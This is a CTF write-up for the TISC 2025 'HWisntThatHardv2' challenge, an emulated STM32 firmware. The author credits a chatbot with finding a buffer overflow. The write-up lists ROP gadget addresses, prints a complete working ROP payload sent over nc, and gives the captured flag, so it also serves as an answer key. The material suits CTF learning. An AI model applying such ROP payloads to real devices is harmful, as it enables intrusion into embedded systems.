# Level-9 - HWisntThatHardv2

DESCRIPTION

Last year many brave agents showed the world what they could do against PALINDROME's custom TPM chips. Their actions sent chills down the spines of all those who seek to do us harm. This 

year, we managed to exfiltrate an entire STM32-based system and its firmware from within SPECTRE.

Since you probably do not have STM32 development boards at home, we have built an emulator that does its best to emulate the STM32 chip and its peripherals. This is neatly packaged inside a

docker container, so you can run it on your own machine.

Your mission, if you choose to accept it, is to find out what this device is built to do, how to interact with it, and, if possible, how to exploit it.

You will be provided with the following emulator + firmware:

- MD5 (HWisntThatHard_v2.tar.xz) = 1246c6248e2788613f702a50d162b748
- MD5 (config.yaml) = 5ea0a99dc870dd3ae31370e69c652002
- MD5 (csit_iot.bin) = 57a8e159e6d81e620f618258cd4f4a50
- MD5 (docker-compose.yml) = e284296706c38121e6074cfd09f0a062
- MD5 (Dockerfile) = 84ee422322a23d6e25e73d3a44e59763
- MD5 (ext-flash.bin) = 8ea3bc31ef48ec78012c0c46d857f50e
- MD5 (stm32-emulator) = 731c0d36f8949bd8a5f26ee05b821b8c
- MD5 (stm32f407.svd) = cd5687242c32a448d84e6995065ddaf1


You can perform your attack on a live STM32 module hosted behind enemy lines:

nc chals.tisc25.ctf.sg 51728

attached files

HWisntThatHard_v2.tar.xz

---

# WARNING: If you want to learn how to solve the challenge properly, find another writeup!

Now that the warning is over, CHAT kinda cooked this challenge for me but I'll still try to talk about the challenge :)

So I opened the csit_iot.bin in IDA and searched for strings and pressed X to see where they were being used and found the function sub_8007900().

I pasted the pseudo-code into CHAT and it told me

<img width="770" height="146" alt="image" src="https://github.com/user-attachments/assets/46751c70-bb7d-4a8c-a743-37fe3960d46d" />

Indeed, indeed.

I asked it how do I interect with the server and it gave me the proper format after multiple tries.

So I ran the server locally and started to try and expriement by myself.

```code
{"slot":1}
Slot 1 contains: [84,73,83,67,123,70,65,75,69,95,70,76,65,71,95,71,79,69,83,95,72,69,82,69,125,0,0,0,0,0,0,0]
{"slot":2}
Slot 2 contains: [84,73,83,67,123,70,65,75,69,95,70,76,65,71,95,71,79,69,83,95,72,69,82,69,125,0,0,0,0,0,0,0]
```

I asked CHAT where these values were coming from and it told me that it was getting it from ext-flash.bin.

So I checked it, and saw TISC{REAL_FLAG_GOES_HERE} :0.

Ok so somehow I had to make the server read from the first 32 bytes from the ext-flash.bin.

So I chatted to CHAT more and it told me to send it more functions for it to analyise.

After an intense prompt engineering session, it identified the buffer overflow bug.

To my understanding, when checking slots, once I sent more than 44 bytes, an address is in the next 4 bytes, the programme will jump to that address which allows us to constuct a ROP payload utilizing gadgets such that we can make the problem read the first 32 bytes of the ext-flash.bin.

And this is where it started to cook.

<img width="818" height="382" alt="image" src="https://github.com/user-attachments/assets/a2767272-21fd-493f-9c70-b4e0e37b381c" />

And so I gave the POP {R0-R3, PC} gadget at 0x080068EE to it, it then asked for a SPI READ address and I give it 0x08034E5C where the first four bytes were [03, 00, 00, 00], it then ask for a BLX R3 and I gave it 0x08005526 and then it cooked.

<img width="774" height="510" alt="image" src="https://github.com/user-attachments/assets/54f5ff8c-d974-430a-a853-79e70f4d8be2" />

I asked it to put everything into one line and got 
```
{"slot":1,"data":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,239,104,0,8,0,0,2,64,0,128,0,0,0,0,0,0,221,23,0,8,37,85,0,8,239,190,173,222,239,104,0,8,120,3,0,32,92,78,3,8,4,0,0,0,189,37,0,8,37,85,0,8,239,190,173,222,239,104,0,8,120,3,0,32,0,16,0,32,32,0,0,0,237,43,0,8,37,85,0,8,239,190,173,222,239,104,0,8,0,0,2,64,0,128,0,0,1,0,0,0,221,23,0,8,37,85,0,8,239,190,173,222,239,104,0,8,88,8,0,32,0,16,0,32,32,0,0,0,197,120,1,8,37,85,0,8,239,190,173,222,239,104,0,8,88,8,0,32,10,0,0,0,0,0,0,0,65,119,1,8,37,85,0,8,239,190,173,222,1,121,0,8]}
```

Now I just sent this to the server and I got the flag.

```
nc chals.tisc25.ctf.sg 51728
{"slot":1,"data":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,239,104,0,8,0,0,2,64,0,128,0,0,0,0,0,0,221,23,0,8,37,85,0,8,239,190,173,222,239,104,0,8,120,3,0,32,92,78,3,8,4,0,0,0,189,37,0,8,37,85,0,8,239,190,173,222,239,104,0,8,120,3,0,32,0,16,0,32,32,0,0,0,237,43,0,8,37,85,0,8,239,190,173,222,239,104,0,8,0,0,2,64,0,128,0,0,1,0,0,0,221,23,0,8,37,85,0,8,239,190,173,222,239,104,0,8,88,8,0,32,0,16,0,32,32,0,0,0,197,120,1,8,37,85,0,8,239,190,173,222,239,104,0,8,88,8,0,32,10,0,0,0,0,0,0,0,65,119,1,8,37,85,0,8,239,190,173,222,1,121,0,8]}
Checking...
TISC{3mul4t3d_uC_pwn3d}
```

FLAG: TISC{3mul4t3d_uC_pwn3d}

(Okay, final challenge where CHAT did most of the thinking, once again read another write up for a better understanding of this challenge)
